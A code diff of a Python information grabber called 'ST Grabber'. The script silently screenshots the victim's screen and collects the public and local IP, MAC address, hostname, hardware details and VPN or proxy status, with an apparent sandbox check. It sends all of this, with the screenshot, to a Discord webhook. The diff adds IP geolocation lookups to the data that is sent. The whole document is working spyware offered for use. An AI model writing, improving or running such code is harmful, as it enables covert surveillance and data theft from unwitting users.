@@ -1,6 +1,7 @@
 #author: suegdu
 
-from requests import get
+
+import requests
 from discord_webhook import DiscordEmbed,DiscordWebhook
 import platform
 from platform import uname
@@ -16,11 +17,14 @@ import secrets
 from pathlib import Path
 from uuid import getnode as get_mac
 import socket
-import random
 import datetime
+from datetime import datetime
 
 
-DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"
+
+
+
+DISCORD_WEBHOOK = ""
 
 
 
@@ -33,7 +37,7 @@ try:
     os.chdir(parent)
 except FileExistsError:
     os.chdir(parent)
-now = datetime.datetime.now()
+now = datetime.now()
 rs = secrets.token_hex(6)
 sc = pyautogui.screenshot()
 sc.save(f'{rs}file.png')
@@ -42,13 +46,13 @@ c = wmi.WMI()
 my_system = c.Win32_ComputerSystem()[0]
 time2 = time.time()
 sr = uname()
-
+timealt = datetime.now().time()
 mac = get_mac()
-now = datetime.datetime.now()
+datealt = datetime.date(now)
 local_now = now.astimezone()
 local_tz = local_now.tzinfo
 local_tzname = local_tz.tzname(local_now)
-vpn = get('http://ip-api.com/json?fields=proxy')
+vpn = requests.get('http://ip-api.com/json?fields=proxy')
 proxy = vpn.json()['proxy']
 cpuis = psutil.cpu_percent()
 host3 = socket.gethostname()
@@ -64,7 +68,6 @@ def scale(bytes, suffix="B"):
             return f"{bytes:.2f}{unit}{suffix}"
         bytes /= defined
 proc = platform.processor() 
-
 fknet = False
 try:
  f = subprocess.check_output("ping google.com -n 1")
@@ -75,19 +78,59 @@ else:
 partitions = psutil.disk_partitions()
 disk_io = psutil.disk_io_counters()
 net_io = psutil.net_io_counters()
-
 partitions = psutil.disk_partitions()
 for partition in partitions:
     try:
         partition_usage = psutil.disk_usage(partition.mountpoint)
     except PermissionError:
         continue
-
+def alternative_ip():
+  ip_addr = socket.gethostbyname(ip)
+  headers = {
+    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'
+   }
+  fields = (
+    ("Status", "status"),
+    ("Continent", "continent"),
+    ("Continent Code", "continentCode"),
+    ("Country", "country"),
+    ("Country Code", "countryCode"),
+    ("Region", "region"),
+    ("Region Name", "regionName"),
+    ("City", "city"),
+    ("District", "district"),
+    ("Zipcode", "zip"),
+    ("Latitude", "lat"),
+    ("Longitude", "lon"),
+    ("Timezone", "timezone"),
+    ("Currency", "currency"),
+    ("ISP", "isp"),
+    ("Organization", "org"),
+    ("AS", "as"),
+    ("AS Name", "asname"),
+    ("Reverse DNS", "reverse"),
+    ("Mobile", "mobile"),
+    ("Proxy", "proxy"),
+    ("Hosting", "hosting"),
+    ("IP", "query"),
+  )
+  req = requests.get(f'http://ip-api.com/json/{ip_addr}?fields={",".join([key for _, key in fields])}', headers=headers).json()
+  final_formatting = "\n".join([f"{title}: {{{key}}}" for title, key in fields]).format(**req)
+  webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="IP Information :")
+  embed = DiscordEmbed(title="PT-H14", description="**User (Device)** IP Information :", color=0x0c0057) 
+  embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
+  embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
+  embed.add_embed_field(name="Public IP :", value=ip, inline=True) 
+  embed.add_embed_field(name="Local IP :",value=localip)
+  embed.add_embed_field(name="Alternative Information :",value=final_formatting,inline=True)
+  embed.set_footer(text=f"{time2} | {now} | {timealt} | ", icon_url="https://static.thenounproject.com/png/2256517-200.png")
+  webhook.add_embed(embed)
+  response = webhook.execute()
 def sg():
-
- ip = get('https://api.ipify.org').text 
+ global ip
+ ip = requests.get('https://api.ipify.org').text 
  webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="Screenshot :")
- embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0x0c0057) 
+ embed = DiscordEmbed(title="PT-H14", description="**User (Device)** Main Information :", color=0x0c0057) 
  embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
  embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
  embed.add_embed_field(name="Public IP :", value=ip, inline=True) 
@@ -112,23 +155,12 @@ def sg():
  #embed.add_embed_field(name="CPU Usage :",value=cpuis)
  embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
  embed.add_embed_field(name="VPN :",value=proxy)
- embed.set_footer(text=f"{time2} | {now}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
+ embed.set_footer(text=f"{time2} | {now} | {timealt} | ", icon_url="https://static.thenounproject.com/png/2256517-200.png")
  with open(f"{asr}", "rb") as f:
     webhook.add_file(file=f.read(), filename=f'./{asr}')
  webhook.add_embed(embed)
  response = webhook.execute()
-
-
-
+ alternative_ip()
  os.remove(f"{asr}")
-
-
-
 if __name__ == "__main__":
  sg()
- 
-
-
-
-
-
